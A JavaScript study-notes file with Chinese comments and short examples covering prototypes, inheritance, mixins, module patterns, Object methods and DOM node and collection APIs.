// JavaScript 规定，每个函数都有一个prototype属性，指向一个对象。
// 对于普通函数来说，该属性基本无用。
// 但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。
function f() {};
typeof f.prototype; // "object"
// 原型链
// JavaScript 规定，所有对象都有自己的原型对象（prototype）
// 一方面，任何一个对象，都可以充当其他对象的原型；
// 另一方面，由于原型对象也是对象，所以它也有自己的原型。
// 因此，就会形成一个“原型链”
// Object.prototype的原型是null
Object.getPrototypeOf(Object.prototype); // null
// 注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。
// 所寻找的属性在越上层的原型对象，对性能的影响越大。
// 如果寻找某个不存在的属性，将会遍历整个原型链
// constructor 属性
// prototype对象有一个constructor属性，默认指向prototype对象所在的构造函数
// constructor属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的
function P() {};
var p = new P();
p.constructor === P; // true
p.constructor === P.prototype.constructor; // true
p.hasOwnProperty('constructor'); // false
// 另一方面，有了constructor属性，就可以从一个实例对象新建另一个实例
// 这使得在实例方法中，调用自身的构造函数成为可能
function Constr() {};
var x = new Constr();
var y = new x.constructor();
y instanceof Constr; // true
// constructor属性表示原型对象与构造函数之间的关联关系，如果修改了原型对象，
// 一般会同时修改constructor属性，防止引用的时候出错
// 好的写法
// C.prototype = {
//     constructor: C,
//     method1: function () {},
//     // ...
// };

// 更好的写法
// C.prototype.method1 = function () {};
// 如果不能确定constructor属性是什么函数，
// 还有一个办法：通过name属性，从实例得到构造函数的名称
// instanceof 运算符
// 返回一个布尔值，表示对象是否为某个构造函数的实例
function Constr() {};
var x = new Constr();
x instanceof Constr; // true
// 由于instanceof检查整个原型链，因此同一个实例对象，可能会对多个构造函数都返回true
var d = new Date();
d instanceof Date; // true
d instanceof Object; // true
// 如果一个对象的原型是null，instanceof运算符的判断就会失真
var obj = Object.create(null);
typeof obj; // "object"
Object.create(null) instanceof Object; // false
// instanceof运算符只能用于对象，不适用原始类型的值
var s = 'hello';
s instanceof String; // false
// 对于undefined和null，instanceOf运算符总是返回false
undefined instanceof Object; // false
null instanceof Object; // false
// 利用instanceof运算符，还可以巧妙地解决，调用构造函数时，忘了加new命令的问题
function Fubar(foo, bar) {
    if (this instanceof Fubar) {
        this._foo = foo;
        this._bar = bar;
    } else {
        return new Fubar(foo, bar);
    }
};
// 构造函数的继承
// 两步实现
// 第一步是在子类的构造函数中，调用父类的构造函数。
// function Sub(value) {
//     Super.call(this);
//     this.prop = value;
// };
// 第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。
// Sub.prototype是子类的原型，要将它赋值为Object.create(Super.prototype)，
// 而不是直接等于Super.prototype。
// 否则后面两行对Sub.prototype的操作，会连父类的原型Super.prototype一起修改掉
// Sub.prototype = Object.create(Super.prototype);
// Sub.prototype.constructor = Sub;
// Sub.prototype.method = '...';
// 举例
function Shape() {
    this.x = 0;
    this.y = 0;
};
Shape.prototype.move = function (x, y) {
    this.x += x;
    this.y += y;
    console.info('Shape moved.');
};
// 第一步，子类继承父类的实例
function Rectangle() {
    Shape.call(this); // 调用父类构造函数
}
// 另一种写法
function Rectangle() {
    this.base = Shape;
    this.base();
}
// 第二步，子类继承父类的原型
Rectangle.prototype = Object.create(Shape.prototype);
Rectangle.prototype.constructor = Rectangle;
// instanceof运算符会对子类和父类的构造函数，都返回true
var rect = new Rectangle();
rect instanceof Rectangle; // true
rect instanceof Shape; // true
// 上面代码中，子类是整体继承父类。有时只需要单个方法的继承
// ClassB.prototype.print = function () {
//     ClassA.prototype.print.call(this);
//     // some code
// };

// 多重继承 
// avaScript 不提供多重继承功能，
// 即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能
// 子类S同时继承了父类M1和M2。这种模式又称为 Mixin（混入）
function M1() {
    this.hello = 'hello';
};

function M2() {
    this.world = 'world';
};

function S() {
    M1.call(this);
    M2.call(this);
};
// 继承 M1
S.prototype = Object.create(M1.prototype);
// 继承链上加入 M2
Object.assign(S.prototype, M2.prototype);
// 指定构造函数
S.prototype.constructor = S;
var s = new S();
s.hello; // 'hello'
s.world; // 'world'
// 模块
// JavaScript 模块化编程，已经成为一个迫切的需求。
// 理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块
// 但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。
// 下面介绍传统的做法，如何利用对象实现模块的效果
// JavaScript 模块的基本写法
var module1 = (function () {
    var _count = 0;
    var m1 = function () {
        //...
    };
    var m2 = function () {
        //...
    };
    return {
        m1: m1,
        m2: m2
    };
})();
console.info(module1._count); //undefined
// 模块的放大模式
// 如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，
// 这时就有必要采用“放大模式”（augmentation）
// 代码为module1模块添加了一个新方法m3()，然后返回新的module1模块
var module1 = (function (mod) {
    mod.m3 = function () {
        //...
    };
    return mod;
})(module1);
// 在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。
// 如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，
// 这时就要采用"宽放大模式"（Loose augmentation）
// 与"放大模式"相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象
var module1 = (function (mod) {
    //...
    return mod;
})(window.module1 || {});

// 输入全局变量 
// 独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互
// 为了在模块内部调用全局变量，必须显式地将其他变量输入模块
// module1模块需要使用 jQuery 库和 YUI 库，就把这两个库（其实是两个模块）
// 当作参数输入module1。
// 这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。
var module1 = (function ($, YAHOO) {
    //...
})(jQuery, YAHOO);
// 立即执行函数还可以起到命名空间的作用
// finalCarousel对象输出到全局，对外暴露init和destroy接口，
// 内部方法go、handleEvents、initialize、dieCarouselDie都是外部无法调用的
(function ($, window, document) {
    function go(num) {}

    function handleEvents() {}

    function initialize() {}

    function dieCarouselDie() {}
    //attach to the global scope
    window.finalCarousel = {
        init: initialize,
        destroy: dieCarouselDie
    }
})(jQuery, window, document);
// Object 对象的相关方法
// Object.getPrototypeOf()
// 返回参数对象的原型。这是获取原型对象的标准方法
var F = function () {};
var f = new F();
Object.getPrototypeOf(f) === F.prototype; // true
// 下面是几种特殊对象的原型
// 空对象的原型是 Object.prototype
Object.getPrototypeOf({}) === Object.prototype; // true
// Object.prototype 的原型是 null
Object.getPrototypeOf(Object.prototype) === null; // true
// 函数的原型是 Function.prototype
function f() {};
Object.getPrototypeOf(f) === Function.prototype; // true
// Object.setPrototypeOf()
// 为参数对象设置原型，返回该参数对象。它接受两个参数，第一个是现有对象，第二个是原型对象
var a = {};
var b = {
    x: 1
};
Object.setPrototypeOf(a, b);
Object.getPrototypeOf(a) === b; // true
a.x; // 1
// Object.create()
// 从一个实例对象，生成另一个实例对象
// 接受一个对象作为参数，然后以它为原型，返回一个实例对象
// 原型对象
var A = {
    print: function () {
        console.log('hello');
    }
};
// 实例对象
var B = Object.create(A);
Object.getPrototypeOf(B) === A; // true
// Object.create方法可以用下面的代码代替
if (typeof Object.create !== 'function') {
    Object.create = function (obj) {
        function F() {}
        F.prototype = obj;
        return new F();
    };
};
// 如果想要生成一个不继承任何属性的对象，可以将Object.create的参数设为null
var obj = Object.create(null);
obj.valueOf(); // TypeError: Object [object Object] has no method 'valueOf'
// Object.create方法生成的新对象，动态继承了原型。
// 在原型上添加或修改任何方法，会立刻反映在新对象之上。
var obj1 = {
    p: 1
};
var obj2 = Object.create(obj1);
obj1.p = 2;
obj2.p; // 2
// Object.create方法还可以接受第二个参数。该参数是一个属性描述对象，
// 它所描述的对象属性，会添加到实例对象，作为该对象自身的属性。
var obj = Object.create({}, {
    p1: {
        value: 123,
        enumerable: true,
        configurable: true,
        writable: true,
    },
    p2: {
        value: 'abc',
        enumerable: true,
        configurable: true,
        writable: true,
    }
});
// 等同于
var obj = Object.create({});
obj.p1 = 123;
obj.p2 = 'abc';
//   Object.create方法生成的对象，继承了它的原型对象的构造函数
function A() {};
var a = new A();
var b = Object.create(a);
b.constructor === A; // true
b instanceof A; // true
// Object.prototype.isPrototypeOf()
// 实例对象的isPrototypeOf方法，用来判断该对象是否为参数对象的原型
var o1 = {};
var o2 = Object.create(o1);
var o3 = Object.create(o2);
o2.isPrototypeOf(o3); // true
o1.isPrototypeOf(o3); // true
// 由于Object.prototype处于原型链的最顶端，所以对各种实例都返回true，
// 只有直接继承自null的对象除外。
Object.prototype.isPrototypeOf({}); // true
Object.prototype.isPrototypeOf([]); // true
Object.prototype.isPrototypeOf(/xyz/); // true
Object.prototype.isPrototypeOf(Object.create(null)); // false
// Object.prototype.__proto__
// 返回该对象的原型。该属性可读写。
// 前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。
// 因此，应该尽量少用这个属性，
// 而是用Object.getPrototypeOf()和Object.setPrototypeOf()，进行原型对象的读写操作。
// 获取原型对象方法的比较
// 前两种都不是很可靠。__proto__属性只有浏览器才需要部署，其他环境可以不部署。
// 而obj.constructor.prototype在手动改变原型对象时，可能会失效。
// 推荐使用第三种Object.getPrototypeOf方法，获取原型对象
obj.__proto__;
obj.constructor.prototype;
Object.getPrototypeOf(obj);
// Object.getOwnPropertyNames()
// 返回一个数组，成员是参数对象本身的所有属性的键名，不包含继承的属性键名。
Object.getOwnPropertyNames(Date);
// ["parse", "arguments", "UTC", "caller", "name", "prototype", "now", "length"]
// 只获取对象本身的属性之中那些可以遍历的属性，使用Object.keys方法
Object.keys(Date); // []
// Object.prototype.hasOwnProperty()
// 方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。
// hasOwnProperty方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法
Date.hasOwnProperty('length'); // true
Date.hasOwnProperty('toString'); // false
// in 运算符和 for...in 循环
// in运算符返回一个布尔值，表示一个对象是否具有某个属性。
// 它不区分该属性是对象自身的属性，还是继承的属性
// in运算符常用于检查一个属性是否存在
'length' in Date // true
    'toString' in Date // true
// for...in循环获得对象的所有可遍历属性（不管是自身的还是继承的）
var o1 = {
    p1: 123
};
var o2 = Object.create(o1, {
    p2: {
        value: "abc",
        enumerable: true
    }
});
for (p in o2) {
    console.info(p);
}; // p2// p1
// 为了在for...in循环中获得对象自身的属性，可以采用hasOwnProperty方法判断一下。
for (var name in object) {
    if (object.hasOwnProperty(name)) {
        /* loop code */
    }
};
// 获得对象的所有属性（不管是自身的还是继承的，也不管是否可枚举），可以使用下面的函数。
function inheritedPropertyNames(obj) {
    var props = {};
    while (obj) {
        Object.getOwnPropertyNames(obj).forEach(function (p) {
            props[p] = true;
        });
        obj = Object.getPrototypeOf(obj); //获取对象的原型对象
    }
    return Object.getOwnPropertyNames(props); //获取对象本身的所有属性的键名
};
inheritedPropertyNames(Date);
// [
//  "caller",
//  "constructor",
//  "toString",
//  "UTC",
//  ...
// ]
// 对象的拷贝
// 要拷贝一个对象，需要做到下面两件事情。
// 确保拷贝后的对象，与原对象具有同样的原型。
// 确保拷贝后的对象，与原对象具有同样的实例属性
// 根据上面两点，实现的对象拷贝函数
function copyObject(orig) {
    var copy = Object.create(Object.getPrototypeOf(orig)); //获取原型对象并创建一个继承该原型对象的实例
    copyOwnPropertiesFrom(copy, orig);
    return copy;
};

function copyOwnPropertiesFrom(target, source) {
    Object.getOwnPropertyNames(source) //获取对象本身所有的属性的键值
        .forEach(function (propKey) {
            var desc = Object.getOwnPropertyDescriptor(source, propKey); //获取对象的属性描述对象
            Object.defineProperty(target, propKey, desc); //定义对象的属性的属性描述对象
        });
    return target;
};
// 另一种更简单的写法，是利用 ES2017 才引入标准的Object.getOwnPropertyDescriptors方法。
function copyObject(orig) {
    return Object.create(
        Object.getPrototypeOf(orig), //获取原型对象
        Object.getOwnPropertyDescriptors(orig) //获取对象的所有属性的属性描述对象
    ); //创建新对象并将第一个参数作为原型对象且添加第二个参数作为本身属性
};

/**************************异步操作*******************************/

/**************************DOM*******************************/
// DOM 概述
// DOM
// DOM 是 JavaScript 操作网页的接口,它的作用是将网页转为
// 一个 JavaScript 对象，从而可以用脚本进行各种操作
// DOM 只是一个接口规范,可以用各种语言实现
// 浏览器根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，
// 再由这些节点组成一个树状结构（DOM Tree）。
// 所有的节点和最终的树状结构，都有规范的对外接口。
// 节点
// 节点的类型有七种。
// 浏览器提供一个原生的节点对象Node，这七种节点都继承了Node
// Document：整个文档树的顶层节点
// DocumentType：doctype标签（比如<!DOCTYPE html>）
// Element：网页的各种HTML标签（比如<body>、<a>等）
// Attribute：网页元素的属性（比如class="right"）
// Text：标签之间或标签包含的文本
// Comment：注释
// DocumentFragment：文档的片段
// 节点树
// 一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树
// 浏览器原生提供document节点，代表整个文档
document; // 整个文档树
// 文档的第一层有两个节点，第一个是文档类型节点（<!doctype html>），
// 第二个是 HTML 网页的顶层容器标签<html>
// 除了根节点，其他节点都有三种层级关系。
// 父节点关系（parentNode）：直接的那个上级节点
// 子节点关系（childNodes）：直接的下级节点
// 同级节点关系（sibling）：拥有同一个父节点的节点
//===== 
// Node 接口
// 属性
// Node.prototype.nodeType
// 返回一个整数值，表示节点的类型
// Node 对象定义了几个常量，对应这些类型值
// 文档节点（document）：9，对应常量Node.DOCUMENT_NODE
// 元素节点（element）：1，对应常量Node.ELEMENT_NODE
// 属性节点（attr）：2，对应常量Node.ATTRIBUTE_NODE
// 文本节点（text）：3，对应常量Node.TEXT_NODE
// 文档片断节点（DocumentFragment）：11，对应常量Node.DOCUMENT_FRAGMENT_NODE
// 文档类型节点（DocumentType）：10，对应常量Node.DOCUMENT_TYPE_NODE
// 注释节点（Comment）：8，对应常量Node.COMMENT_NODE
document.nodeType === Node.DOCUMENT_NODE // true
// Node.prototype.nodeName 
// 返回节点的名称
//<div id="d1">hello world</div>
var div = document.getElementById('d1');
div.nodeName // "DIV"
// Node.prototype.nodeValue
// 返回一个字符串，表示当前节点本身的文本值，该属性可读写
// <div id="d1">hello world</div>
var div = document.getElementById('d1');
div.nodeValue // null
div.firstChild.nodeValue // "hello world"
// Node.prototype.textContent
// 返回当前节点和它的所有后代节点的文本内容
// <div id="divA">This is <span>some</span> text</div>
document.getElementById('divA').textContent // This is some text
// 对于文本节点（text）、注释节点（comment）和属性节点（attr），
// textContent属性的值与nodeValue属性相同。
// 对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。
// 如果一个节点没有子节点，则返回空字符串。
// 文档节点（document）和文档类型节点（doctype）的textContent属性为null。
// 如果要读取整个文档的内容，可以使用document.documentElement.textContent。
// Node.prototype.baseURI
// 返回一个字符串，表示当前网页的绝对路径。该属性为只读
// 浏览器根据这个属性，计算网页上的相对路径的 URL。
// 该属性的值一般由当前网址的 URL（即window.location属性）决定，
// 但是可以使用 HTML 的<base>标签，改变该属性的值
// 设置了以后，baseURI属性就返回<base>标签设置的值
// <base href="http://www.example.com/page.html">
// 如果无法读到网页的 URL，baseURI属性返回null
// Node.prototype.ownerDocument
// 返回当前节点所在的顶层文档对象，即document对象
// ocument对象本身的ownerDocument属性，返回null
var d = p.ownerDocument;
d === document // true
// Node.prototype.nextSibling
// 返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回null
// nextSibling属性可以用来遍历所有子节点。
var el = document.getElementById('div1').firstChild;
while (el !== null) {
    console.log(el.nodeName);
    el = el.nextSibling;
}
// Node.prototype.previousSibling
// 返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回null
// Node.prototype.parentNode
// 返回当前节点的父节点。
// 对于一个节点来说，它的父节点只可能是三种类型：
// 元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。
// 文档节点（document）和文档片段节点（documentfragment）的父节点都是null。
// 另外，对于那些生成后还没插入 DOM 树的节点，父节点也是null。
// 通过node.parentNode属性将node节点从文档里面移除
if (node.parentNode) {
    node.parentNode.removeChild(node);
}

// Node.prototype.parentElement
// 返回当前节点的父元素节点。
// 如果当前节点没有父节点，或者父节点类型不是元素节点，则返回null
// 由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。
// parentElement属性相当于把后两种父节点都排除了
// Node.prototype.firstChild，Node.prototype.lastChild
// 返回当前节点的第一个子节点，如果当前节点没有子节点，则返回null。
// 返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回null
// 注意，返回的除了元素节点，还可能是文本节点或注释节点
// Node.prototype.childNodes
// 返回一个类似数组的对象（NodeList集合），成员包括当前节点的所有子节点
// 如果当前节点不包括任何子节点，则返回一个空的NodeList集合。
// 由于NodeList对象是一个动态集合，一旦子节点发生变化，立刻会反映在返回结果之中
var children = document.querySelector('ul').childNodes;
// Node.prototype.isConnected
// 返回一个布尔值，表示当前节点是否在文档之中
// test节点是脚本生成的节点，
// 没有插入文档之前，isConnected属性返回false，插入之后返回true
var test = document.createElement('p');
test.isConnected // false
document.body.appendChild(test);
test.isConnected // true
// =====
// 方法
// Node.prototype.appendChild()
// 接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。
// 该方法的返回值就是插入文档的子节点
// 如果参数节点是 DOM 已经存在的节点，appendChild()方法会将其从原来的位置，移动到新位置。
// 如果appendChild()方法的参数是DocumentFragment节点，那么插入的是DocumentFragment的
// 所有子节点，而不是DocumentFragment节点本身。返回值是一个空的DocumentFragment节点。
var p = document.createElement('p');
document.body.appendChild(p);
// Node.prototype.hasChildNodes()
// 返回一个布尔值，表示当前节点是否有子节点
// 注意，子节点包括所有类型的节点，并不仅仅是元素节点
// hasChildNodes方法结合firstChild属性和nextSibling属性，
// 可以遍历当前节点的所有后代节点。
function DOMComb(parent, callback) {
    if (parent.hasChildNodes()) {
        for (var node = parent.firstChild; node; node = node.nextSibling) {
            DOMComb(node, callback);
        }
    }
    callback(parent);
}
DOMComb(document.body, console.log)
// Node.prototype.cloneNode()
// 接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点
// 使用注意点
// 克隆一个节点，会拷贝该节点的所有属性，但是会丧失addEventListener
// 方法和on-属性（即node.onclick = fn），添加在这个节点上的事件回调函数
// 该方法返回的节点不在文档之中，即没有任何父节点
// 克隆一个节点之后，DOM 有可能出现两个有相同id属性（即id="xxx"）的
// 网页元素，这时应该修改其中一个元素的id属性
// 如果原节点有name属性，可能也需要修改。
var cloneUL = document.querySelector('ul').cloneNode(true);
// Node.prototype.insertBefore()
// 用于将某个节点插入父节点内部的指定位置，返回值是插入的新节点
// 新建一个<p>节点，插在document.body.firstChild的前面
var p = document.createElement('p');
document.body.insertBefore(p, document.body.firstChild);
// 如果insertBefore方法的第二个参数为null，则新节点将插在当前节点内部的最后位置
// 如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置
var p = document.createElement('p');
document.body.insertBefore(p, null);
// 由于不存在insertAfter方法，如果新节点要插在父节点的某个子节点后面，
// 可以用insertBefore方法结合nextSibling属性模拟。
parent.insertBefore(s1, s2.nextSibling);
// 如果要插入的节点是DocumentFragment类型，那么插入的将是DocumentFragment的所有子节点，
// 而不是DocumentFragment节点本身。返回值将是一个空的DocumentFragment节点。
// Node.prototype.removeChild()
// 接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。
// 注意，这个方法是在divA的父节点上调用的，不是在divA上调用的。
// 被移除的节点依然存在于内存之中，但不再是 DOM 的一部分。
// 所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面
// 如果参数节点不是当前节点的子节点，removeChild方法将报错
// 移除当前节点的所有子节点
var element = document.getElementById('top');
while (element.firstChild) {
    element.removeChild(element.firstChild);
}
// Node.prototype.replaceChild() 
// 用于将一个新的节点，替换当前节点的某一个子节点，返回值是替换走的那个节点oldChild。
var divA = document.getElementById('divA');
var newSpan = document.createElement('span');
divA.parentNode.replaceChild(newSpan, divA);
// Node.prototype.contains() 
// 返回一个布尔值，表示参数节点是否满足以下三个条件之一。
// 参数节点为当前节点。
// 参数节点为当前节点的子节点。
// 参数节点为当前节点的后代节点。
// 检查参数节点node，是否包含在当前文档之中
document.body.contains(node)
// 当前节点传入contains方法，返回true
nodeA.contains(nodeA) // true
// Node.prototype.isEqualNode()，Node.prototype.isSameNode()
// isEqualNode方法返回一个布尔值，用于检查两个节点是否相等
// 所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。
var p1 = document.createElement('p');
var p2 = document.createElement('p');
p1.isEqualNode(p2) // true
// isSameNode方法返回一个布尔值，表示两个节点是否为同一个节点
var p1 = document.createElement('p');
var p2 = document.createElement('p');
p1.isSameNode(p1) // true
// Node.prototype.normalize()
// 用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，
// 并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。
// 使用normalize方法之前，wrapper节点有两个毗邻的文本子节点。
// 使用normalize方法之后，两个文本子节点被合并成一个
// 该方法是Text.splitText的逆方法
var wrapper = document.createElement('div');
wrapper.appendChild(document.createTextNode('Part 1 '));
wrapper.appendChild(document.createTextNode('Part 2 '));
wrapper.childNodes.length // 2
wrapper.normalize();
wrapper.childNodes.length // 1
// Node.prototype.getRootNode()
// 返回当前节点所在文档的根节点document，与ownerDocument属性的作用相同。
// 该方法可用于document节点自身，这一点与document.ownerDocument不同
document.getRootNode() // document
document.ownerDocument // null
// =====
// NodeList 接口，HTMLCollection 接口
// 节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。
// DOM 提供两种节点集合，用于容纳多个节点：NodeList和HTMLCollection。
// 这两种集合都属于接口规范。许多 DOM 属性和方法，
// 返回的结果是NodeList实例或HTMLCollection实例。
// 主要区别是，
// NodeList可以包含各种类型的节点，
// HTMLCollection只能包含 HTML 元素节点。
// NodeList 接口
// NodeList实例是一个类似数组的对象，它的成员是节点对象。
// 通过以下方法可以得到NodeList实例。
// Node.childNodes
// document.querySelectorAll()等节点搜索方法
document.body.childNodes instanceof NodeList // true
// NodeList 实例children不是数组，但是具有length属性和forEach方法。
var children = document.body.childNodes;
Array.isArray(children) // false
children.length // 34
children.forEach(console.log)
// 注意，NodeList 实例可能是动态集合，也可能是静态集合。
// 所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，
// 都会立刻反映在 NodeList 实例。
// 目前，只有Node.childNodes返回的是一个动态集合，其他的 NodeList 都是静态集合
// 文档增加一个子节点，NodeList 实例children的length属性就增加了1。
var children = document.body.childNodes;
children.length // 18
document.body.appendChild(document.createElement('p'));
children.length // 19
// NodeList.prototype.length 
// 返回 NodeList 实例包含的节点数量
// NodeList.prototype.forEach()
// 用于遍历 NodeList 的所有成员
// NodeList.prototype.item()
// 接受一个整数值作为参数，表示成员的位置，返回该位置上的成员
// item(0)返回第一个成员
document.body.childNodes.item(0)
// 一般情况下，都是使用方括号运算符，而不使用item方法。
document.body.childNodes[0]
// NodeList.prototype.keys()，
// NodeList.prototype.values()，
// NodeList.prototype.entries()
// 这三个方法都返回一个 ES6 的遍历器对象，可以通过for...of循环遍历获取每一个成员的信息。
// 区别在于，
// keys()返回键名的遍历器，
// values()返回键值的遍历器，
// entries()返回的遍历器同时包含键名和键值的信息
var children = document.body.childNodes;
for (var key of children.keys()) {
    console.log(key);
}
// 0
// 1
// 2
// ...
for (var value of children.values()) {
    console.log(value);
}
// #text
// <script>
// ...
for (var entry of children.entries()) {
    console.log(entry);
}
// Array [ 0, #text ]
// Array [ 1, <script> ]
// ...
// HTMLCollection 接口 
// HTMLCollection是一个节点对象的集合，
// 只能包含元素节点（element），不能包含其他类型的节点。
// 它的返回值是一个类似数组的对象，
// 但是与NodeList接口不同，HTMLCollection没有forEach方法，只能使用for循环遍历。
// 返回HTMLCollection实例的，主要是一些Document对象的集合属性，
// 比如document.links、document.forms、document.images等。
// HTMLCollection实例都是动态集合，节点的变化会实时反映在集合中
// 如果元素节点有id或name属性，那么HTMLCollection实例上面，
// 可以使用id属性或name属性引用该节点元素。如果没有对应的节点，则返回null。
// ocument.images是一个HTMLCollection实例，
// 可以通过<img>元素的id属性值，从HTMLCollection实例上取到这个元素
// <img id="pic" src="http://example.com/foo.jpg">
var pic = document.getElementById('pic');
document.images.pic === pic // true
// HTMLCollection.prototype.length
// 返回HTMLCollection实例包含的成员数量。
document.links.length // 18
// HTMLCollection.prototype.item() 
// 接受一个整数值作为参数，表示成员的位置，返回该位置上的成员
var c = document.images;
var img0 = c.item(0);
// HTMLCollection.prototype.namedItem()
// 参数是一个字符串，表示id属性或name属性的值，返回对应的元素节点。
// 如果没有对应的节点，则返回null。
// <img id="pic" src="http://example.com/foo.jpg">
var pic = document.getElementById('pic');
document.images.namedItem('pic') === pic // true
// =====
// ParentNode 接口，ChildNode 接口
// 节点对象除了继承 Node 接口以外，还会继承其他接口。
// ParentNode接口表示当前节点是一个父节点，提供一些处理子节点的方法。
// ChildNode接口表示当前节点是一个子节点，提供一些相关方法。
// ParentNode 接口
// 如果当前节点是父节点，就会继承ParentNode接口。
// 由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）
// 拥有子节点，因此只有这三类节点会继承ParentNode接口。
// ParentNode.children
// 返回一个HTMLCollection实例，成员是当前节点的所有元素子节点。该属性只读。
// 注意，children属性只包括元素子节点,，不包括其他类型的子节点
// 另外，HTMLCollection是动态集合，会实时反映 DOM 的任何变化
for (var i = 0; i < el.children.length; i++) {
    // ...
}
// ParentNode.firstElementChild
// 返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回null。
document.firstElementChild.nodeName // "HTML"
// ParentNode.lastElementChild 
// 返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回null。
document.lastElementChild.nodeName // "HTML
// ParentNode.childElementCount
// 返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回0。
document.body.childElementCount // 13
// ParentNode.append()，ParentNode.prepend()
// append方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面
// 该方法不仅可以添加元素子节点，还可以添加文本子节点
// 注意，该方法没有返回值。
// prepend方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。
// 它的用法与append方法完全一致，也是没有返回值。
var parent = document.body;
// 添加元素子节点
var p = document.createElement('p');
parent.append(p);
// 添加文本子节点
parent.append('Hello');
// 添加多个元素子节点
var p1 = document.createElement('p');
var p2 = document.createElement('p');
parent.append(p1, p2);
// 添加元素子节点和文本子节点
var p = document.createElement('p');
parent.append('Hello', p);
// ChildNode 接口
// 如果一个节点有父节点，那么该节点就继承了ChildNode接口。
// ChildNode.remove()
// 用于从父节点移除当前节点
// 在 DOM 里面移除了el节点
el.remove()
// ChildNode.before()，ChildNode.after()
// before方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。
// 注意，该方法不仅可以插入元素节点，还可以插入文本节点
// after方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。
// 用法与before方法完全相同
var p = document.createElement('p');
var p1 = document.createElement('p');
// 插入元素节点
el.before(p);
// 插入文本节点
el.before('Hello');
// 插入多个元素节点
el.before(p, p1);
// 插入元素节点和文本节点
el.before(p, 'Hello');
// ChildNode.replaceWith()
// 使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。
// el节点将被span节点替换
var span = document.createElement('span');
el.replaceWith(span);
// =====
// Document 节点
// 概述
// document节点对象代表整个文档，每张网页都有自己的document对象
// window.document属性就指向这个对象。
// 只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。
// document对象有不同的办法可以获取
// 正常的网页，直接使用document或window.document。
// iframe框架里面的网页，使用iframe节点的contentDocument属性。
// Ajax 操作返回的文档，使用XMLHttpRequest对象的responseXML属性。
// 内部节点的ownerDocument属性。
// document对象继承了EventTarget接口、Node接口、ParentNode接口。
// 这意味着，这些接口的方法都可以在document对象上调用。
// 除此之外，document对象还有很多自己的属性和方法。
// 属性
// 快捷方式属性
// document.defaultView
// 返回document对象所属的window对象。如果当前文档不属于window对象，该属性返回null
document.defaultView === window // true
// document.doctype
// 对于 HTML 文档来说，document对象一般有两个子节点
// 第一个子节点是document.doctype，指向<DOCTYPE>节点，即文档类型（简写DTD）节点
// 如果网页没有声明 DTD，该属性返回null。
var doctype = document.doctype;
doctype // "<!DOCTYPE html>"
doctype.name // "html"
// document.documentElement
// document.documentElement属性返回当前文档的根元素节点（root）
// HTML网页的该属性，一般是<html>节点。
// document.body，document.head
// document.body属性指向<body>节点，document.head属性指向<head>节点。
// 这两个属性总是存在的，如果网页源码里面省略了<head>或<body>，浏览器会自动创建。
// 另外，这两个属性是可写的，如果改写它们的值，相当于移除所有子节点。
// document.scrollingElement
// 返回文档的滚动元素。也就是说，当文档整体滚动时，到底是哪个元素在滚动。
// 标准模式下，这个属性返回的是文档的根元素document.documentElement（即<html>）。
// 兼容（quirk）模式下，返回的是<body>元素，如果该元素不存在，返回null。
// 页面滚动到浏览器顶部
document.scrollingElement.scrollTop = 0;
// document.activeElement
// 返回获得当前焦点（focus）的DOM元素。
// 通常，这个属性返回的是<input>、<textarea>、<select>等表单元素，
// 如果当前没有焦点元素，返回<body>元素或null。
// document.fullscreenElement
// 返回当前以全屏状态展示的 DOM 元素。如果不是全屏状态，该属性返回null
// 通过document.fullscreenElement可以知道<video>元素
// 有没有处在全屏状态，从而判断用户行为
if (document.fullscreenElement.nodeName == 'VIDEO') {
    console.log('全屏播放视频');
}
// 节点集合属性
// 属性返回一个HTMLCollection实例，表示文档内部特定元素的集合。
// 这些集合都是动态的，原节点有任何变化，立刻会反映在集合中
// document.links
// 返回当前文档所有设定了href属性的<a>及<area>节点
// 打印文档所有的链接
var links = document.links;
